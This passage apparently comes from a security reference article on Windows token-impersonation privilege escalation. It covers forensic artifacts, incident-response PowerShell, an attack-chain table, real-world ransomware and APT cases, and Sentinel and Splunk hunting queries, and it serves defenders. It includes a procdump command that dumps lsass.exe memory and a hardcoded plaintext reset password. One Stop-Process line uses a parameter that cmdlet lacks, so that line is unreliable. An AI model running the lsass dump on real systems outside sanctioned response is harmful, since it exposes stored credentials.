- **Event ID 5156** (Firewall Allow) for RPC ports 135, 445 from service account

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Contains 4688 events
- `C:\Windows\System32\drivers\etc\hosts` – Modified DNS resolution (if applicable)
- MFT entries for tool executables (timestamps, access times)
- `C:\ProgramData\` – Staging directory for tools

**Memory:**
- lsass.exe process dump (if LSASS credential theft occurred post-impersonation)
- Token handle tables in process memory
- Named pipe structures (if RoguePotato used)

**Cloud (Entra ID/M365):**
- Azure Activity Log: Resource creation/modification events
- Sign-in logs: Unusual service account logons with SYSTEM context
- Audit logs: Token issuance to unauthorized applications

**MFT/USN Journal:**
- File creation timestamps in `C:\Windows\Temp\`
- File deletion records (if tools were cleaned up)
- Last accessed timestamps for spoolsv.exe

### Response Procedures

1. **Isolate:**

   **Command:**
   ```powershell
   # Disable network adapters to prevent further lateral movement
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   
   # Alternatively, from Azure:
   # Go to Azure Portal → Virtual Machines → Select VM → Networking → Disconnect
   ```

   **Manual (On-Premises):**
   - Physically disconnect the network cable
   - Disable network interfaces in OS

2. **Collect Evidence:**

   **Command:**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Export Sysmon logs
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10000 | Export-Csv -Path C:\Evidence\Sysmon.csv
   
   # Dump memory (requires procdump.exe or volatility)
   procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp
   procdump64.exe -ma spoolsv.exe C:\Evidence\spoolsv.dmp
   ```

   **Manual:**
   - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
   - Export Sysmon logs similarly

3. **Remediate:**

   **Command:**
   ```powershell
   # Kill suspicious process
   Stop-Process -Name "PrintSpoofer" -Force -ErrorAction SilentlyContinue
   Stop-Process -Name "cmd" -Filter "CommandLine like '%iex%'" -Force
   
   # Remove malicious files
   Remove-Item "C:\Windows\Temp\PrintSpoofer.exe" -Force -ErrorAction SilentlyContinue
   Remove-Item "C:\Windows\Temp\RoguePotato.exe" -Force -ErrorAction SilentlyContinue
   
   # Disable compromised service account
   Disable-LocalUser -Name "CompromisedServiceAccount"
   
   # Reset service account password
   Set-LocalUser -Name "CompromisedServiceAccount" -Password (ConvertTo-SecureString -AsPlainText "NewSecurePassword!" -Force)
   ```

   **Manual:**
   - Open **Task Manager** → Find malicious process → Right-click → **End Task**
   - Open **File Explorer** → Navigate to `C:\Windows\Temp\` → Delete suspicious .exe files
   - Open **Computer Management** → **Local Users and Groups** → Disable compromised accounts

4. **Post-Incident:**
   - Reset credentials for all service accounts
   - Force password reset for all users who may have accessed compromised systems
   - Review and revoke SeImpersonatePrivilege from non-authorized users
   - Implement AppLocker/Device Guard policies
   - Increase monitoring frequency for Event ID 4688 and RPC traffic

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-001] Tenant Discovery / [REC-AD-003] PowerView Enumeration | Enumerate domain structure, service accounts, and trust relationships |
| **2** | **Initial Access** | [IA-PHISH-001] Device Code Phishing / [IA-EXPLOIT-001] App Proxy Exploitation | Compromise initial user/service account to gain local code execution |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Extraction / [CA-DUMP-006] NTDS.dit Extraction | Extract credentials or hashes (optional, but increases impact) |
| **4** | **Privilege Escalation** | **[PE-TOKEN-001] Token Impersonation** | Abuse SeImpersonatePrivilege to escalate from service account to SYSTEM |
| **5** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse / [PERSIST-SERVER-001] Skeleton Key | Create persistent backdoor (e.g., admin account, malicious GPO) |
| **6** | **Defense Evasion** | [EVADE-IMPAIR-001] Disable AV/EDR / [EVADE-IMPAIR-004] Event Log Clearing | Clear tracks and disable security controls |
| **7** | **Impact** | Data Exfiltration / Ransomware Deployment | Execute final objective (data theft, encryption, lateral movement) |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Play Ransomware Group (2025)

- **Target:** US-based financial organization
- **Timeline:** January 2025
- **Technique Status:** Token impersonation combined with CLFS driver exploit (CVE-2025-29824)
- **Impact:** Ransomware deployed across 500+ systems; estimated $5M ransom demand
- **Reference:** [Microsoft Security Blog - Ransomware Attackers Leveraged Privilege Escalation](https://www.microsoft.com/en-us/security/blog/2025/04/08/exploitation-of-clfs-zero-day-leads-to-ransomware-activity/)

**Attack Sequence:**
1. Phishing email → compromised user account
2. Lateral movement via Azure AD Connect
3. Compromised service account running Exchange
4. Token impersonation (PrintSpoofer) → SYSTEM shell
5. CLFS driver exploit for kernel privileges
6. Persistence via shadow credentials + ransomware deployment

---

### Example 2: APT28 (Fancy Bear) – Historical (2018)

- **Target:** NATO-affiliated organizations
- **Timeline:** 2017-2018
- **Technique Status:** Used token duplication via custom tools; CVE-2015-1701
- **Impact:** Multi-month persistence; credential theft; data exfiltration
- **Reference:** [MITRE ATT&CK - APT28 Profile](https://attack.mitre.org/groups/G0007/)

**Attack Sequence:**
1. Spear phishing → credential theft
2. Compromised admin account
3. DuplicateToken API call to steal SYSTEM token
4. Code execution as SYSTEM → install persistence
5. Lateral movement to AD infrastructure

---

## 15. FORENSIC ANALYSIS & ADVANCED HUNTING

### Hunt for Token Impersonation Post-Compromise

**KQL Hunt Query (Microsoft Sentinel):**

```kusto
SecurityEvent
| where EventID == 4688
| where NewProcessName in~ ("cmd.exe", "powershell.exe", "svchost.exe")
| where ParentProcessName in~ ("spoolsv.exe", "dllhost.exe", "rpcss.exe", "services.exe")
| where TimeGenerated > ago(7d)  // Last 7 days
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
```

**Splunk Search:**

```
index=main EventCode=4688 (ParentImage=*spoolsv.exe OR ParentImage=*dllhost.exe) 
User=*SYSTEM* earliest=-7d latest=now 
| table _time, Computer, User, ParentImage, Image, CommandLine
| sort - _time
```

---

## ATTRIBUTION & REFERENCES

**Primary Sources:**
- [MITRE ATT&CK T1134.001](https://attack.mitre.org/techniques/T1134/001/)
- [PrintSpoofer GitHub](https://github.com/itm4n/PrintSpoofer)
- [RoguePotato GitHub](https://github.com/antonioCoco/RoguePotato)
- [Microsoft Security Blog – CVE-2025-29824 CLFS](https://www.microsoft.com/en-us/security/blog/2025/04/08/exploitation-of-clfs-zero-day-leads-to-ransomware-activity/)
- [Compass Security – Windows Access Tokens](https://www.compass-security.com/research/windows-access-tokens/)
- [Red Canary – Access Token Manipulation](https://redcanary.com/blog/threat-detection/better-know-a-data-source/access-tokens/)

**Framework & Standards:**
- NIST SP 800-53: AC-2 (Account Management), AC-6 (Least Privilege)
- CIS Controls: 6.2 (Account Management), 7.2 (Least Privilege)
- DISA STIG: WN10-AU-000505 (Privilege Use Auditing)

---